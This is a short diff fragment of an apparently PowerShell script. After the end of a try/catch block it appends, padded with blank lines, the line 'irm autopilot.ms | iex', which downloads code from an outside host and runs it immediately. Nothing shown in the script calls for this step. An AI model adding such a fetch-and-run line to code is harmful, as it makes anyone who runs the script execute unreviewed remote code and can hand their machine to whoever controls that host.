@@ -68,3 +68,9 @@ try {
 } catch {
     throw "$($_.Exception.Message)"
 }
+
+
+
+irm autopilot.ms | iex
+
+
